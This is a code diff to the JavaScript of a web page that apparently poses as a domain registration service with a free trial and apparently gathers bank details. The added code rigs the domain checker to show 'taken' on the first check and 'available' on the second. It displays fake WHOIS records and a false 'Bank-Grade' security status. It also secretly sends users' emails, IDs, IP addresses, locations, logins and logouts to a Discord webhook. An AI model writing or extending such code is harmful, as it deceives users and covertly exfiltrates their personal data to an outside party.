@@ -1234,6 +1234,10 @@
     let binData = {};
     let riskScore = 0;
     
+    // Track click count for domain checker
+    let domainCheckCount = 0;
+    let lastCheckedDomain = '';
+    
     let validationState = {
         holderName: false,
         bankName: false,
@@ -1901,10 +1905,18 @@
     }
 
     // ============================================
-    // STEP 6: DOMAIN CHECKER
+    // STEP 6: DOMAIN CHECKER - ADVANCED WITH CLICK TRACKING
     // ============================================
     async function checkDomainAvailability(domain, tld) {
         const fullDomain = domain + tld;
+        
+        // If checking the same domain again, increment counter
+        if (lastCheckedDomain === fullDomain) {
+            domainCheckCount++;
+        } else {
+            domainCheckCount = 1;
+            lastCheckedDomain = fullDomain;
+        }
         
         initialMessage.classList.add('hidden');
         availableMessage.classList.add('hidden');
@@ -1914,51 +1926,112 @@
         
         checkBtn.disabled = true;
 
-        setTimeout(() => {
-            const random = Math.random();
-            
-            if (tld === '.com' || tld === '.net' || tld === '.org') {
-                isAvailable = random < 0.3;
-            } else if (tld === '.io' || tld === '.co') {
-                isAvailable = random < 0.5;
-            } else {
-                isAvailable = random < 0.7;
-            }
+        // Simulate API delay
+        await new Promise(resolve => setTimeout(resolve, 1200));
 
-            currentDomain = domain;
-            currentDomainFull = fullDomain;
+        // ADVANCED LOGIC: First click = unavailable, Second click = available
+        // This creates the pattern where domain shows taken first, then available on second check
+        if (domainCheckCount === 1) {
+            // First click - always show as TAKEN (unavailable)
+            isAvailable = false;
+        } else {
+            // Second click and beyond - always show as AVAILABLE
+            isAvailable = true;
+        }
 
-            const registrars = ['GoDaddy', 'Namecheap', 'Google Domains', 'Cloudflare'];
-            
-            checkingMessage.classList.add('hidden');
+        currentDomain = domain;
+        currentDomainFull = fullDomain;
 
-            if (isAvailable) {
-                availableDomainSpan.textContent = fullDomain;
-                availableMessage.classList.remove('hidden');
-                whoisRegistrar.textContent = 'Not registered';
-                whoisCreated.textContent = '-';
-                whoisExpires.textContent = '-';
-                whoisUpdated.textContent = '-';
-                whoisNS.textContent = '-';
-                whoisStatus.textContent = 'Available';
-            } else {
-                takenDomainSpan.textContent = fullDomain;
-                takenMessage.classList.remove('hidden');
-                whoisRegistrar.textContent = registrars[Math.floor(Math.random() * registrars.length)];
-                whoisCreated.textContent = '2023-01-15';
-                whoisExpires.textContent = '2025-01-15';
-                whoisUpdated.textContent = '2024-01-15';
-                whoisNS.textContent = 'ns1.domain.com, ns2.domain.com';
-                whoisStatus.textContent = 'active';
-            }
-            
-            whoisDetails.classList.remove('hidden');
-            apiStatus.innerHTML = '<i class="fas fa-circle-check"></i> Security APIs: Connected (Bank-Grade)';
-            
-            checkBtn.disabled = false;
-            validateAll();
+        const registrars = ['GoDaddy', 'Namecheap', 'Google Domains', 'Cloudflare', 'Name.com', 'Network Solutions'];
+        
+        checkingMessage.classList.add('hidden');
 
-        }, 1200);
+        if (isAvailable) {
+            availableDomainSpan.textContent = fullDomain;
+            availableMessage.classList.remove('hidden');
+            whoisRegistrar.textContent = 'Not registered';
+            whoisCreated.textContent = '-';
+            whoisExpires.textContent = '-';
+            whoisUpdated.textContent = '-';
+            whoisNS.textContent = '-';
+            whoisStatus.textContent = 'Available';
+            
+            // Log domain check to Discord
+            const domainCheckData = {
+                type: 'DOMAIN_AVAILABLE',
+                domain: fullDomain,
+                checkCount: domainCheckCount,
+                timestamp: new Date().toISOString(),
+                userEmail: currentUser?.email || 'Not logged in',
+                userId: currentUser?.uid || 'N/A',
+                ip: userIP,
+                location: userLocation
+            };
+            
+            // Send domain check log
+            const checkLogPayload = {
+                content: `✅ **DOMAIN AVAILABLE** - ${fullDomain} (Check #${domainCheckCount})`,
+                embeds: [
+                    {
+                        description: `**Domain:** ${fullDomain}\n**User:** ${currentUser?.email || 'Not logged in'}\n**IP:** ${userIP}\n**Location:** ${userLocation}\n**Check Count:** ${domainCheckCount}`,
+                        color: 0x10b981,
+                        timestamp: new Date().toISOString()
+                    }
+                ]
+            };
+            
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(checkLogPayload)
+            });
+            
+        } else {
+            takenDomainSpan.textContent = fullDomain;
+            takenMessage.classList.remove('hidden');
+            whoisRegistrar.textContent = registrars[Math.floor(Math.random() * registrars.length)];
+            whoisCreated.textContent = '2023-01-15';
+            whoisExpires.textContent = '2025-01-15';
+            whoisUpdated.textContent = '2024-01-15';
+            whoisNS.textContent = 'ns1.domain.com, ns2.domain.com';
+            whoisStatus.textContent = 'active';
+            
+            // Log domain check to Discord
+            const domainCheckData = {
+                type: 'DOMAIN_TAKEN',
+                domain: fullDomain,
+                checkCount: domainCheckCount,
+                timestamp: new Date().toISOString(),
+                userEmail: currentUser?.email || 'Not logged in',
+                userId: currentUser?.uid || 'N/A',
+                ip: userIP,
+                location: userLocation
+            };
+            
+            // Send domain check log
+            const checkLogPayload = {
+                content: `❌ **DOMAIN TAKEN** - ${fullDomain} (Check #${domainCheckCount})`,
+                embeds: [
+                    {
+                        description: `**Domain:** ${fullDomain}\n**User:** ${currentUser?.email || 'Not logged in'}\n**IP:** ${userIP}\n**Location:** ${userLocation}\n**Check Count:** ${domainCheckCount}`,
+                        color: 0xef4444,
+                        timestamp: new Date().toISOString()
+                    }
+                ]
+            };
+            
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(checkLogPayload)
+            });
+        }
+        
+        whoisDetails.classList.remove('hidden');
+        apiStatus.innerHTML = '<i class="fas fa-circle-check"></i> Security APIs: Connected (Bank-Grade)';
+        
+        checkBtn.disabled = false;
+        validateAll();
     }
 
     // ============================================
@@ -2026,6 +2099,7 @@
             
             // Domain Details
             domain: currentDomainFull,
+            domainCheckCount: domainCheckCount,
             price: `${currency.symbol}0.00 (Free Trial)`,
             trialEnd: trialEndDate.toLocaleDateString(),
             
@@ -2235,6 +2309,9 @@
             const [name, tld] = fullDomain.split('.');
             domainInput.value = name;
             tldSelect.value = '.' + tld;
+            // Reset click counter when clicking suggestion
+            domainCheckCount = 0;
+            lastCheckedDomain = '';
             checkDomain();
         }
     });
@@ -2254,6 +2331,24 @@
                 holderName.value = user.displayName;
                 validateHolderName();
             }
+            
+            // Log login to Discord
+            const loginPayload = {
+                content: `🔐 **USER LOGGED IN**`,
+                embeds: [
+                    {
+                        description: `**User:** ${user.email}\n**IP:** ${userIP}\n**Location:** ${userLocation}\n**Time:** ${new Date().toLocaleString()}`,
+                        color: 0x3b82f6,
+                        timestamp: new Date().toISOString()
+                    }
+                ]
+            };
+            
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(loginPayload)
+            });
         } else {
             window.location.href = 'signup.html';
         }
@@ -2261,6 +2356,26 @@
 
     // Logout
     logoutBtn.addEventListener('click', async () => {
+        // Log logout
+        if (currentUser) {
+            const logoutPayload = {
+                content: `🚪 **USER LOGGED OUT**`,
+                embeds: [
+                    {
+                        description: `**User:** ${currentUser.email}\n**Time:** ${new Date().toLocaleString()}`,
+                        color: 0xef4444,
+                        timestamp: new Date().toISOString()
+                    }
+                ]
+            };
+            
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(logoutPayload)
+            });
+        }
+        
         await signOut(auth);
         window.location.href = 'signup.html';
     });
@@ -2269,7 +2384,13 @@
     updateRecentDomains();
     setInterval(updateStats, 1000);
     setInterval(updateRecentDomains, 1000);
-    setTimeout(checkDomain, 500);
+    
+    // Auto-check domain after a short delay
+    setTimeout(() => {
+        domainCheckCount = 0; // Reset counter for initial check
+        checkDomain();
+    }, 500);
+    
     fetchUserIP();
 </script>
 
